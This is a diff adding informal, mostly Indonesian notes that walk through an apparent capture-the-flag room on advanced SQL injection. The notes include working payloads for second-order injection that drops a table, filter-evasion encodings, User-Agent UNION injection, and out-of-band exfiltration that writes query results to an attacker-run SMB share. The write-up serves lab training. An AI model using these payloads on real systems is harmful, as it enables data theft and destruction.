@@ -1,0 +1,89 @@
+1. Introduction 
+- What is the port on which MySQL service is running? :
+> cek aja nmap langsung
+> sudo nmap -sCV -vv [ip] --min-rate 1000 -p- -oN scan.nmap 
+> cek aja mysql nya
+
+2. Quick Recap
+- What type of SQL injection uses the same communication channel for both the injection and data retrieval?
+> cek materi ada tuh inband outband
+- In out-of-band SQL injection, which protocol is usually used to send query results to the attacker's server?
+> cek materi ada tuh di out of band sqli nya
+
+3. Second-Order SQL Injection
+- What is the flag value after updating the title of all books to "compromised"?
+> ke ip/second/add.php -> add aja name nya smith'; Update books set book_name = "compromised";--, sisanya bebas
+> next ke update.php -> edit aja sisanya mau itu title kek yang penting bukan pelod, update aja
+> ada flag klaim
+- What is the flag value once you drop the table hello from the database? 
+> methodnya sama, beda payload aja ->  ngasal'; DROP TABLE hello; -- 
+> jadi ke add.php aja, add buku pake payload itu di first input, next add, ke update.php
+> ganti value nya yang input 2 ato 3, ganti aja, dah bisa tuh
+
+
+4. Filter Evasion Techniques
+- What is the MySQL error code once an invalid query is entered with bad characters?
+> ke ip/encoding 
+> tes dulu ' OR 1=1, nah ada tuh error code nya xxxx angka semua coeg
+- What is the name of the book where book ID=6?
+> OR gabisa ganti || aja -> ' || 1=1--+ -> encode ke url encode
+> inject lewat burp karna lewat form gabisa gatau kenapa
+> ternyata gabisa di inject lewat form karna dia tu pake get, cek di network dah
+> jadi injectnya lewat url aja 
+> http://ip/encoding/search_books.php?book_name=%27%20%7C%7C%201=1%20--+ 
+> make sure encode nya di url encode cyberchef aja, kalo pake tools umum ' nya ke encode ga work
+> di cyberchef aman kok itu
+
+5. Filter Evasion Techniques (continued)
+- What is the password for the username "attacker"?
+> endpoint di: http://ip/space/search_users.php?username=... 
+> coba aja kek payload sebelumnya
+> 69' || 1=1 -- +: di encode -> space = %20, ' = %27 -> 69%27%20||%201=1%20--%20+
+> gabisa ternyata space %20, alternatif ada tab space %09, line feed %0A
+> bisa gini juga ternyata: %27%09||%091=1%09--%09+ ato '%09||%091=1%09--%09+
+> dah cek aja tuh: http://ip/space/search_users.php?username=%27%09||%091=1%09--%09+ 
+> spasi di bypass pake alternatif char lain tadi, %09 ato ga %0A
+- Which of the following can be used if the SELECT keyword is banned? Write the correct option only.
+a) SElect
+b) SeLect
+c) Both a and b
+d) We cannot bypass SELECT keyword filter
+> a bisa buat bypass b juga bisa buat bypass soalnya 2 2 nya spesial kapital
+> jawab aja c
+
+6. Out-of-band SQL Injection
+- What is the output of the @@version on the MySQL server?
+> ada disini endpoint nya: http://ip/oob/search_visitor.php
+> cari dulu: find / -name smbserver.py 2>/dev/null
+> cd aja kesana biar bisa dipake app nya ato cp aja dah
+> python3 smbserver.py -smb2support -comment "mY telkom eh my logs server" -debug logs /tmp
+> pake yang ini jir lainnya gabisa soalnya: /usr/share/doc/python3-impacket/examples/smbserver.py
+> dah jadi gini nanti 
+> python3 /usr/share/doc/python3-impacket/examples/smbserver.py  -smb2support -comment "mY telkom eh my logs server" -debug logs /tmp
+> run dah inject aja command nya gini: '; select @@version into outfile '\\\\ipmu\\logs\\out.txt'; --
+> cek di /tmpp soalnya tadi debug logs nya di /tmp ls /tmp aja
+- What is the value of @@basedir variable?
+> sama aja cuman ganti aja dari @@version ke @@basedir
+> '; select @@basedir into outfile '\\\\ip\\logs\\dir.txt'; --
+
+7. Other Techniques
+- What is the value of the flag field in the books table where book_id =1?
+> http://10.10.209.221/httpagent/, target sqli di user agent
+> harus 2 kolom jir, tes aja gini User-Agent: ' ORDER BY 3; #, nanti error, cek by 2 nanti aman
+> jadi harus 2 kolom, tadi coba gini error: User-Agent: ' UNION SELECT * FROM books; #
+> select flag doang juga error, jadi jawabannya gini
+> User-Agent: ' UNION SELECT flag, book_id FROM books; #    
+- What field is detected on the server side when extracting the user agent from an HTTP request? 
+> field yg ngedetect user agent di http req, ya User-Agent dong fieldnya
+> jawab aja itu
+
+8. Automation
+- Does the dynamic nature of SQL queries assist a pentester in identifying SQL injection (yea/nay)?
+> jawab nay yea ajalah agak ambigu soalnya
+
+9. Best Practices
+- What command does MSSQL support to execute system commands?
+> cek di materi nya ada, mssql run exec sys command nya pake apa
+> xp_cmdshell noh
+
+
